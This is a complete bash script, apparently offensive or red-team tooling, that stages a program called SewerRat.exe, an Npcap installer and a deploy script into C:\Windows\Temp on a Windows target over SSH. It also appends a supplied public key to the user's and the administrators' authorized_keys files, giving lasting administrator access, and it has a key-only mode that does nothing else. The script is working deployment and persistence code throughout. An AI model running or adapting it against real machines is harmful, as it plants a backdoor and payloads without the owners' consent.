#!/bin/bash

# ============================================================================
# SewerRat SCP File Transfer Script
# Alternative to HTTP (Python server) for transferring artifacts
# ============================================================================

# Default variables
TARGET=""
USER="Administrator"
PASSWORD=""
SSH_PORT="22"
DEST_DIR="C:\Windows\Temp"
KEY_FILE=""
PUB_KEY=""
KEY_ONLY=0

# Display usage instructions
usage() {
    echo "SewerRat SCP Deployment Script"
    echo "Usage: $0 -t <target_ip> [-u <username>] [-w <password>] [-p <ssh_port>] [-d <remote_dir>] [-i <ssh_key>] [-k <pub_key_path>] [-K]"
    echo ""
    echo "Options:"
    echo "  -t  Target Windows IP address (Required)"
    echo "  -u  SSH Username (Default: Administrator)"
    echo "  -w  SSH Password (Optional, requires sshpass)"
    echo "  -p  SSH Port (Default: 22)"
    echo "  -d  Destination directory on target (Default: C:\Windows\Temp)"
    echo "  -i  Identity file (SSH Private Key) (Optional)"
    echo "  -k  Public Key to add to target authorized_keys (Optional)"
    echo "  -K  Key only mode: skip transferring SewerRat payloads (Optional)"
    echo "  -h  Show this help menu"
    echo ""
    echo "Example: $0 -t 10.1.1.2 -u Administrator -w 'Password123!' -k ~/.ssh/id_rsa.pub -K"
    exit 1
}

# Parse command line arguments
while getopts "t:u:w:p:d:i:k:Kh" opt; do
    case "$opt" in
        t) TARGET=$OPTARG ;;
        u) USER=$OPTARG ;;
        w) PASSWORD=$OPTARG ;;
        p) SSH_PORT=$OPTARG ;;
        d) DEST_DIR=$OPTARG ;;
        i) KEY_FILE="-i $OPTARG" ;;
        k) PUB_KEY=$OPTARG ;;
        K) KEY_ONLY=1 ;;
        h) usage ;;
        *) usage ;;
    esac
done

# Validate required arguments
if [ -z "$TARGET" ]; then
    echo "[-] Error: Target IP (-t) is required."
    usage
fi

# Determine base paths
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
BASE_DIR="$(dirname "$SCRIPT_DIR")"

# Define files to transfer
FILES=(
    "$BASE_DIR/dist/SewerRat.exe"
    "$BASE_DIR/npcap-1.87.exe"
    "$SCRIPT_DIR/deploy.ps1"
)

if [ "$KEY_ONLY" -eq 0 ]; then
    # Validate local files exist before starting transfer
    echo "[*] Checking local artifacts..."
    for file in "${FILES[@]}"; do
        if [ ! -f "$file" ]; then
            echo "[-] Error: Required file not found -> $file"
            echo "    Tip: Make sure you ran 'make all' to build SewerRat.exe in /dist"
            exit 1
        fi
    done
fi

if [ -n "$PASSWORD" ]; then
    SSH_CMD="sshpass -p $PASSWORD ssh"
    SCP_CMD="sshpass -p $PASSWORD scp"
else
    SSH_CMD="ssh"
    SCP_CMD="scp"
fi

if [ -n "$PUB_KEY" ]; then
    if [ ! -f "$PUB_KEY" ]; then
        echo "[-] Error: Public key file not found -> $PUB_KEY"
    else
        echo "[*] Adding public key to target's authorized_keys..."
        KEY_CONTENT=$(cat "$PUB_KEY")
        PS_CMD="\$k='${KEY_CONTENT}'; \$d=\"\$env:USERPROFILE\\.ssh\"; if(!(Test-Path \$d)){New-Item -ItemType Directory -Force -Path \$d | Out-Null}; Add-Content -Force -Path \"\$d\\authorized_keys\" -Value \$k; if(Test-Path 'C:\ProgramData\ssh'){Add-Content -Force -Path 'C:\ProgramData\ssh\administrators_authorized_keys' -Value \$k}"
        
        $SSH_CMD $KEY_FILE -p $SSH_PORT "${USER}@${TARGET}" "powershell -Command \"$PS_CMD\""
        if [ $? -eq 0 ]; then
            echo "[+] Public key successfully added to target."
        else
            echo "[-] Failed to add public key."
        fi
    fi
fi

if [ "$KEY_ONLY" -eq 1 ]; then
    echo "[+] Key added! Skipping payload file transfer due to -K flag."
    exit 0
fi

# Create target directory using SSH just in case it doesn't exist
echo "[*] Connecting to $TARGET to ensure '$DEST_DIR' exists..."
$SSH_CMD $KEY_FILE -p $SSH_PORT "${USER}@${TARGET}" "powershell -Command \"if (-not (Test-Path '${DEST_DIR}')) { New-Item -ItemType Directory -Force -Path '${DEST_DIR}' | Out-Null }\""

# Optional: User may be prompted for password if not utilizing SSH keys
echo "[*] Moving files via SCP to ${USER}@${TARGET}:${DEST_DIR}"

for file in "${FILES[@]}"; do
    filename=$(basename "$file")
    echo "    -> Transferring $filename..."
    $SCP_CMD $KEY_FILE -P $SSH_PORT "$file" "${USER}@${TARGET}:${DEST_DIR}/$filename"
    
    if [ $? -ne 0 ]; then
        echo "[-] Failed to transfer $filename."
        exit 1
    fi
done

echo "[+] Operations completed successfully!"
echo "[*] Next Steps on Target ($TARGET):"
echo "    1. SSH/WinRM into the box."
echo "    2. Navigate to: cd ${DEST_DIR}"
echo "    3. Run: .\deploy.ps1 (Make sure to adapt deploy.ps1 to use these local files instead of downloading them)"
